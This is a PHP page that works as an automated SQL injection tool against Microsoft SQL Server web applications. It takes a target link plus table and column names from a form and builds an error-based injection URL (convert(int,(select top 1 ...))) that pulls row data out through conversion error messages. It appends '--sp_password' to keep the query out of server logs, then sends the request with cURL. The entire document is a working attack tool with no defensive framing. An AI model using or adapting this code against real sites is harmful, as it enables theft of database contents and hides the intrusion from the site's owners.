<html><head><title>Generating link</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"><style type="text/css">
<!--
body {
	background-image: url(07-02-16@094722.jpg);
}
-->
</style></head><body>
<?php
ini_set ("max_execution_time","360000");
class CURL 
{
	var $callback = false;
	function setCallback($func_name) 
	{
		$this->callback = $func_name;
	}
	function doRequest($method, $url, $vars) 
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		if ($method == 'POST') 
		{
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
		}
		$data = curl_exec($ch);
		curl_close($ch);
		if ($data) 
		{
			if ($this->callback)
			{
				$callback = $this->callback;
				$this->callback = false;
				return call_user_func($callback, $data);
			} 
			else 
			{
			return $data;
			}
		} 
		else
		{
		return curl_error($ch);
		}
	}
	function get($url) 
	{
		return $this->doRequest('GET', $url, 'NULL');
	}
	function post($url, $vars) 
	{
		return $this->doRequest('POST', $url, $vars);
	}
}

$cc = new CURL();
$url=$_POST["link"];
$table1=$_POST["table1"];
$table2=$_POST["table2"];
$column1=$_POST["column1"];
$column2=$_POST["column2"];
$doublet=false;
if ($table2!=null)
{
	$doublet=true;
}
$fields1=$_POST["fields1"];
$field1=explode("\n", $fields1);
$i=0;
while ($field1[$i]!='')
{
	$i++;
	$field1[$i]=trim($field1[$i]);
}
$field1[0]=trim($field1[0]);
$url.="convert(int,(select%20top%201%20";
for ($j=0;$j<$i;$j++)
{
	$url.="%2bchar(32)%2bchar(124)%2bchar(32)%2bconvert(varchar,isnull(convert(varchar,A.".$field1[$j]."),char(32)))";
}

if ($doublet)
{
	$fields2=$_POST["fields2"];
	$field2=explode("\n", $fields2);
	$k=0;
	while ($field2[$k]!='')
	{
		$k++;
		$field2[$k]=trim($field2[$k]);
	}
	$field2[0]=trim($field2[0]);
	for ($h=0;$h<$k;$h++)
	{
		$url.="%2bchar(32)%2bchar(124)%2bchar(32)%2bconvert(varchar,isnull(convert(varchar,B.".$field2[$h]."),char(32)))";
	}
}

$url.="%20from%20".$table1."%20A";
if ($doublet)
{
	$url.=",".$table2."%20B%20where%20A.".$column1."=B.".$column2;
}
$url.="%20order%20by%20A.".$column1."%20desc))--sp_password";
echo "<pre>";
$dat = $cc->get("$url");
echo $url;
?>
</body></html>